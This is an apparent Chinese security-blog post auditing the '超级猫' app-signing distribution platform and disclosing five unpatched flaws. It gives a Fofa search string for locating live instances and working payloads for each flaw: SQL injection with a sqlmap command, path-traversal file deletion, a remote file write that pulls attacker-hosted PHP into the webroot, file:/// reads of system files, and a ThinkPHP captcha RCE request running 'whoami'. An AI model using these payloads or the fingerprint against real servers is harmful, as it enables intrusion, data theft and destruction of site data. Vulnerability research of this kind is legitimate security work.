#  (0day)超级猫签名APP分发平台RCE漏洞审计   
原创 Mstir  星悦安全   2024-07-27 11:39  
  
## 0x00 前言  
## 超级猫超级签名分发平台是一个安卓苹果APP分发平台，能够对所有安卓苹果的APP进行签名分发，使所有自行开发的APP能够签名使用，包括登录注册等功能，还提供有SDK  
##   
  
**Fofa:"/themes/97013266/public/static/css/pc.css"**  
  
************  
**开发框架:ThinkPHP，ThinkAdmin Debug:True**  
## 0x01 前台SQL注入漏洞  
位于 /user/controller/InstallController.php 控制器的 downfile_ios 方法通过$_GET传入参数id 赋值给$url变量，然后直接被插入到SELECT查询字句中，因为$_GET为原生函数，所以TP的路由并没有过滤它.```
//ios下载
public function downfile_ios()
{

    //$url=$_SERVER['HTTP_REFERER'];
    $url = $_GET['id'];
    //  $url='http://y14.com/D614';
    $result = Db::name("user_posted")->where("er_logo='$url' and endtime>" . time())->find();
    $this->assign('result', $result);
    echo $this->fetch('../app/user/view/install/downfile_ios.xml');
    exit;
  }
```  
  
**因此处并无鉴权，所以可直接注入，Payload:**  
```
GET /user/install/downfile_ios?id=') UNION ALL SELECT NULL,NULL,CONCAT(IFNULL(CAST(CURRENT_USER() AS NCHAR),0x20)),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- - HTTP/1.1
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Host: 127.0.0.1:81
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eJp0J4IHwfXoibxoO5YLjTwZsmH0DLRmEYoBNqV18jyicEvbuk4Rel09IQp3AUWBtABOZFwsiaMyXGQ/640?wx_fmt=other&from=appmsg "")  
  
**python sqlmap.py -u "http://127.0.0.1:81/user/install/downfile_ios?id=*" --level=3 --dbms=mysql**  
  
****## 0x02 前台任意文件删除漏洞  
  
**位于 /portal/controller/IndexController.php 控制器中的deldir 方法存在unlink函数，且对传参无明显过滤，导致漏洞产生!******  
```
function deldir($path){
  //如果是目录则继续
  if(is_dir($path)){
    //扫描一个文件夹内的所有文件夹和文件并返回数组
    $p = scandir($path);
    foreach($p as $val){
      //排除目录中的.和..
      if($val !="." && $val !=".."){
        //如果是目录则递归子目录，继续操作
        if(is_dir($path.$val)){
          //子目录中操作删除文件夹和文件
          $this->deldir($path.$val.'/');
          //目录清空后删除空文件夹
          @rmdir($path.$val.'/');
        }else{
          //如果是文件直接删除
          unlink($path.$val);
        }
      }
    }
  }
}
```  
  
**通过传入 ../即可跨到根目录上，并递归删除根目录目标文件夹中的所有文件**  
  
**Payload:**  
```
/portal/Index/deldir?path=../1/
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eJp0J4IHwfXoibxoO5YLjTwibrcLmEhdEutWicRsE8s1fCb364PNnEFIOAlaAia7SYJZtrE3xVaXx0uQ/640?wx_fmt=other&from=appmsg "")  
## 0x03 前台远程文件写入漏洞  
  
**位于 /user/controller/ProfileController.php 控制器的 Download 方法通过curl_exec函数访问网络文件，并且将文件内容保存在任意目录中，导致漏洞产生，通过传入$url 赋值远程文件，$path赋值要写入的文件路径.**  
```
//下载图片
public function download($url, $path = 'upload/img/')
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
    //关闭https验证
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $file = curl_exec($ch);
    curl_close($ch);
    $filename = pathinfo($url, PATHINFO_BASENAME);
    $resource = fopen($path . $filename, 'a');
    fwrite($resource, $file);
    fclose($resource);
    return "/" . $path . $filename;
  }
```  
  
**注意这里需要先登录，这处可以直接注册的.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eJp0J4IHwfXoibxoO5YLjTw2iaLwswNe8QWic3zqpVktqxksvrtgkhcRuyqyTnmOxrvDj02ib4lGfY1w/640?wx_fmt=other&from=appmsg "")  
  
**然后我们使用云服务器，在其根目录放一个111.php 内容如下**  
```
<?php
echo '<?php phpinfo();?>';
?>
```  
  
**之后使用Payload:******  
```
/user/profile/download?url=http://云服务器地址/111.php&path=1
```  
  
**即可将远程文件写入到public目录的1111.php 中.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eJp0J4IHwfXoibxoO5YLjTw9frFoGPgt433DaA42ym14AryAGx4aibok5XtBqfH9TxiaMJUDTvwEOWw/640?wx_fmt=other&from=appmsg "")  
****  
**这里也是一处任意文件读取的地方，可以直接使用file:///协议读取本机上的任意文件，但遗憾的是不支持伪协议**  
  
**Payload:**  
```
/user/profile/download?url=file:///C:/windows/win.ini&path=1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eJp0J4IHwfXoibxoO5YLjTwBP5EliaKRmT5IerlQnqtd59us744mDAkXBIvCSaib7icRQuGXD0MsgPGA/640?wx_fmt=other&from=appmsg "")  
## 0x04 前台任意文件读取漏洞  
位于 /user/controller/ProfileController.php 控制器的 filesd 方法存在curl_exec函数，且传参均可控，导致漏洞产生```
//获取文件信息
public function filesd($file, $url)
{
    header("Content-type: text/html; charset=utf-8");

    // $filePath =dirname(__FILE__)."/../../../public/upload/app/".$file;
    $filePath = "upload/app/" . $file;
    $post_data = array(
      "package" => "@" . $filePath   //要上传的本地文件地址
    );
    $ch = curl_init();
    if (class_exists('\CURLFile')) {
      $post_data['package'] = new \CURLFile(realpath($filePath));
    } else {
      if (defined('CURLOPT_SAFE_UPLOAD')) {
        curl_setopt($ch, CURLOPT_SAFE_UPLOAD, FALSE);
      }
    }
    //关闭https验证
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
  }
```  
  
**我们只需GET传入url和file参数即可(****注意这里也要登录)****Payload:**  
```
/user/profile/filesd?file=1&url=file:///C:/windows/win.ini
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5eJp0J4IHwfXoibxoO5YLjTw5eI0K8LDgpva8uibExALOSm9ia5JoodBWIusl6cfETuib64Qch8GNpSGw/640?wx_fmt=other&from=appmsg "")  
## 0x05 前台任意命令执行漏洞  
  
**由于TP版本为5.0.11 满足TP<5.0.24的历史命令执行漏洞，所以存在前台RCE漏洞，具体网上有文章，这里不分析了.**  
  
**Payload:**  
```
POST /index.php?s=captcha HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 67
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1:81
Origin: http://127.0.0.1:81
Referer: http://127.0.0.1:81/index.php?s=captcha
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

_method=__construct&filter[]=system&get[]=whoami&method=get
```  
  
****  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转，RCE**  
  
**签名分发源码关注公众号发送 qm 获取**  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
